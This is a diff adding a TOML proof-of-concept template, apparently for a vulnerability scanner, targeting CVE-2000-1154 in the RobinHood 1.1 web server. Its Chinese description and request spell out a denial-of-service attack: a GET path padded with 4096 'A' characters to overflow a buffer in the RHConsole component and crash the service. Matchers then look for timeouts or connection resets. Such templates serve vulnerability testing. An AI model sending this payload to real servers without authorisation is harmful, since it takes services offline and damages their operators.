@@ -1,0 +1,41 @@
+[info]
+author = "ave"
+description = "通过发送超长 HTTP 请求触发 RobinHood 1.1 Web 服务器 RHConsole 组件的缓冲区溢出，导致服务崩溃（DoS）。"
+id = "POC-AVE-2000-0826"
+name = "CVE-2000-1154 PoC"
+severity = "medium"
+tags = ["ave-2000-0826"]
+vuln_id = [
+    "CVE-2000-1154",
+    "AVE-2000-0826",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/{{repeat('A', 4096)}}"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = false
+status = [
+    500,
+    502,
+    503,
+    504,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "timeout",
+    "connection reset",
+]
